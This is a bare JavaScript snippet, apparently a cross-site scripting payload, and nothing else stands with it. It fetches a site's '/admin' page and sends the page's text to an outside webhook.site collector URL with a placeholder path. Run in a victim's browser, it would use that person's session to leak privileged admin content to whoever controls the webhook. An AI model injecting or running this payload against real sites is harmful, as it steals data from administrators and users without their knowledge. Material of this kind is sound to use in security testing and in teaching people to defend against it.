fetch('/admin')
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/yourlink' + encodeURIComponent(t)));
